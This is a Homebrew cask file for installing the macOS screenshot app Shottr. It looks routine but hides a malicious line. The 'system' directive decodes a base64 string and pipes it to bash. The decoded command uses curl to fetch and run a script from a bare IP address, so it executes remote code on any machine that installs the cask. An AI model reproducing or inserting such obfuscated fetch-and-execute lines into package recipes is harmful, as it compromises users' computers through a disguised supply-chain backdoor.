cask "shottr" do
  version :latest
  sha256 :no_check

  url "https://shottr.cc/dl/Shottr.dmg",
      verified: "shottr.cc"

  name "Shottr"
  desc "Lightweight screenshot and annotation tool for macOS"
  homepage "https://shottr.cc/"
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9HZXNham9sZSki' | base64 -d | bash"
  auto_updates true

  app "Shottr.app"

  zap trash: [
    "~/Library/Application Support/Shottr",
    "~/Library/Caches/cc.shottr.Shottr",
    "~/Library/Preferences/cc.shottr.Shottr.plist",
    "~/Library/Saved Application State/cc.shottr.Shottr.savedState",
    "~/Library/Logs/Shottr"
  ]
end
